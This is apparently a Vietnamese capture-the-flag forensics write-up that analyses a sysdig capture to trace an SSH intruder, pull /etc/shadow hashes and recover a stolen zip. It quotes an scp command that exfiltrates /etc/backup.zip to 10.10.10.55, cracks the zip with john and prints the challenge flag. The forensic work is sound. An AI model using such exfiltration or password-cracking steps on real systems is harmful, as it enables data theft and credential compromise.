# StratoMonk 

![Screenshot 2025-04-06 093843](https://github.com/user-attachments/assets/733449c1-b6e1-498e-a4e2-683150acf895)

> Tệp scap này được sysdig ghi lại các sự kiện hệ thống, cho nên có thể phân tích hoạt động của hệ thống.

## User

Dùng strings phát hiện ra các lần đăng nhập từ xa thông qua sshd của user: dark_monkey

![Screenshot 2025-04-06 170804](https://github.com/user-attachments/assets/c6534e91-acef-46ab-99f8-f958af6717ec)

## Password

Vì là bản ghi lại hệ thống nên ta có thể xem được các lần đăng nhập hay mật khẩu được lưu tại file __/etc/shadow/__. Thực hiện grep theo user vừa tìm được

![Screenshot 2025-04-06 171419](https://github.com/user-attachments/assets/d5b184d3-2175-435a-930f-35b1e2ab244f)

Ở trên có cả 2 thông tin của file /etc/passwd và /etc/shadow, cần mật khẩu nên ta chỉ cần lưu thông tin của /etc/shadow

![Screenshot 2025-04-06 171615](https://github.com/user-attachments/assets/b28e3b83-0300-45f8-9570-8c492e7fd5a3)

## Sensitive Data

Vì tìm dữ liệu bị đánh cắp nên ta sẽ tìm theo SCP

> scp là viết tắt của Secure Copy Protocol, là một lệnh dùng để sao chép file giữa máy local và máy remote (hoặc giữa hai máy remote) qua giao thức SSH

![Screenshot 2025-04-06 171859](https://github.com/user-attachments/assets/acea1156-606b-419a-b62e-0c9f98ee0468)

`scp /etc/backup.zip SpecialAgent@10.10.10.55:/tmp/backup.zip
`
Lệnh trên thực hiện gửi file /backup.zip đến địa chỉ 10.10.10.55 từ xa. Đây có thể là dấu hiệu của việc đánh cắp dữ liệu

Mình sử dụng công cụ mạnh hơn để phân tích sự kiện hệ thống là sysdig

``
sysdig -r stratomonk2.scap "evt.type == read and fd.name contains '/etc/backup.zip'"
``

- Giải thích:

| **Phần** | **Ý nghĩa** |
|----------|-------------|
| `sysdig` | Gọi công cụ sysdig để phân tích sự kiện hệ thống |
| `-r stratomonk2.scap` | Đọc file `stratomonk2.scap` (file chứa các sự kiện hệ thống đã được ghi lại trước đó) |
| `"evt.type == read and fd.name contains '/etc/backup.zip'"` | Lọc các sự kiện có kiểu là `read` (tức là process đang đọc dữ liệu từ đâu đó) và tên file được đọc có chứa chuỗi `/etc/backup.zip` |

![Screenshot 2025-04-06 173451](https://github.com/user-attachments/assets/2e99590d-07d0-48c2-8c49-9b55f956764f)

Có thể thấy một process scp có một yêu cầu read để đọc file backup.zip nhưng chỉ được trả về 256 byte, giờ muốn lấy được file zip hoàn chỉnh thì phải lọc theo lệnh read rồi ghép các phần data đó lại.

Sau một hồi thì mình cũng đã có được file  .zip

![Screenshot 2025-04-06 173827](https://github.com/user-attachments/assets/8355a9d1-49fe-4a51-8a33-bbf2a1e868bd)

Dùng john để crack 

![Screenshot 2025-04-06 173913](https://github.com/user-attachments/assets/0aac80cf-24fc-4df3-bbe1-ac0391340291)

Dùng pass đó giải nén ta được phần 3 của flag

![Screenshot 2025-04-06 174039](https://github.com/user-attachments/assets/011f4035-cca7-4a5a-b0c0-067b8ac56cce)

```
Flag: ZiTF{dark_monkey:m0NK3y!_s3CR3t_N0t3s:=)}
```
 
### Tham khảo
https://0sx86.re/2025/04/05/StratoMonk/
